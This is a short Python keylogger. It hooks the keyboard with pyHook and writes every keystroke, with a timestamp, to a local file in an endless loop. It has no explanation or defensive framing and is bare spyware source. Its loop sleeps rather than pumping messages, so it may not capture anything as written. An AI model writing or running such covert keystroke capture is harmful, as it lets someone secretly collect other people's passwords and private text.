import pyHook
import time

log_file = open("log.txt", "a")

def on_keyboard_event(event):
    char = chr(event.Ascii)
    
    log_file.write(f"{time.time()}: {char}\n")
    
    return True

hm = pyHook.HookManager()

hm.KeyDown = on_keyboard_event

hm.HookKeyboard()

while True:
    time.sleep(0.1)